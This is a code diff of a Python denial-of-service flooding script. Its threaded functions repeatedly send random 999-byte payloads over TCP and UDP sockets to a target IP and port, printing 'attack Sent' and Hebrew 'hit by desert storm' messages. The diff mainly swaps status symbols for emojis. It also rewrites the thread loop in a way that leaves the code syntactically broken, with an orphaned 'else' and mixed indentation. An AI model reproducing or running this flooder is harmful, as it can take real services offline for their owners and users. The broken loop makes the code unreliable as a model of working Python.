@@ -55,10 +55,10 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print("[+]  \033[32mTCP  \033[33mנפגע על ידי סערה מדברית\033[0m    " +ip+ "")
+			print("[💥]  \033[32mTCP  \033[33mנפגע על ידי סערה מדברית\033[0m    " +ip+ "")
 			print("\033[35m—————————————————————————————————————————————————💥\033[0m")
 		except:
-			print("[-]  \033[31mMay be down\033[0m")
+			print("[🔥]  \033[31mMay be down\033[0m")
 
 def run2():
 	data = random._urandom(999)
@@ -70,18 +70,17 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[*]  \033[96mUDP  \033[92mBlackPhanter-\033[95mattack Sent   \033[33m" +ip+ "\033[0m")
+			print("[🚀]  \033[96mUDP  \033[92mBlackPhanter-\033[95mattack Sent   \033[33m" +ip+ "\033[0m")
 			print("\033[36m—————————————————————————————————————————————————💥\033[0m")
 		except:
 			s.close()
-			print("[-]  \033[31mMay be down\033[0m")
+			print("[🔥]  \033[31mMay be down\033[0m")
 
 
 
 			
-for 'x' in range(threads):
-	if choice == 'x':
-		th = threading.Thread(target = run)
+for x in range(threads):
+	        th = threading.Thread(target = run)
 		th.start()
 	else:
 	        th = threading.Thread(target = run2)
